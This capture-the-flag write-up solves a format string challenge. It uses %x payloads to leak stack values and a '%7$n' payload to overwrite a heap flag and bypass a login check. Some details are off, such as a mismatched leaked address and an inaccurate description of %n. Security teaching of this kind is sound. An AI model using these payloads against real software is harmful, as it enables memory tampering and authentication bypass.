# Log Me In!

Only the executable file was given. This was tagged as a "format string" challenge.

We run the program first.

```
user = 0x4202a0
Enter your username:
cookie
Enter password for user: cookie
cookie
Invalid login information.
```
The decompiled code from Ghidra is as follows; I have done some minor changes to improve the readability.

```
int main(void) { 
  char* __ptr = calloc(1, 40);
  printf("user = %p\n", __ptr);
  printf("Enter your username:");
  fgets((__ptr + 4), 20, stdin);
  printf("Enter password for user: ");
  printf((__ptr + 4));
  fgets((__ptr + 24), 20, stdin);
  if (*__ptr == 0) {
    printf("Invalid login information.");
  }
  else {
    printf("Successfully logged in!");
    giveFlag();
  }
  free(__ptr);
  return 0;
}
```

The code, though appearing to be very simple, did take me a while to fully understand.

Firstly, ```__ptr``` is a pointer to a buffer allocated on the heap, and ```calloc()``` will set the entire buffer to zeroes. Its address is shown, which is important later on.

A prompt for the username is then called, and ```fgets()``` writes the username to an offset 4 bytes off the memory address up to a total of 20 bytes, and the password fills up the remaining buffer.

This means that the first 4 bytes of the buffer are empty (from ```calloc()```), and logging in is not possible unless the first 4 bytes are written to.

### The exploit 
A good explanation of the string formatting vulnerability can be found [here](https://www.youtube.com/watch?v=2HxyGWD1htg). Simply put, format specifiers in ```printf()``` can be used to read values on the stack, and write to values elsewhere.

I played around with the ```%x``` format specifier, which prints out the values on the stack, to get things started with. After some experimentation, a few values on the stack were printed out. 

```
$ python2 -c 'print "%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x"' | ./logmein
user = 0x11882a0
Enter your username:
Enter password for user: 40202f-0-0-11882a4-19-be9a79d0-Invalid login information.
```
The value ```0x12fe2a4``` was found on the stack, which meant that memory address of the username (4 bytes off ```user```) was present, but not the actual address of ```user```. The input, capped to a total of 20 characters, was too long to show the other variables on the stack. 

Removing the hyphens (though this makes things less clear), other values further up the stack can be shown:
```
$ python2 -c 'print "%x%x%x%x%x%x%x%x%x"' | ./logmein
user = 0x23272a0
Enter your username:
Enter password for user: 40202f0023272a419158a692023272a00a0287083
Invalid login information.
```

The address of ```user``` can be found at the seventh 4-byte value on the stack. We confirm this by using ```%7$x``` as an input:
```
$ python2 -c 'print "%7$x"' | ./logmein
user = 0xdb32a0
Enter your username:
Enter password for user: db32a0
Invalid login information.
```

Now, the only thing left is to write to this memory address for the flag to be shown. This can be done by using the ```%n``` specifier. The (hexadecimal) value to the left of the specifier is written to the address specified.

**Solution**
```
$ python2 -c 'print "123%7$n"' | ./logmein
user = 0x15d3010
Enter your username:
Enter password for user: 123
adsf
Successfully logged in!
```

**Flag**
```
flag{why_does_printf_even_have_%n}
```
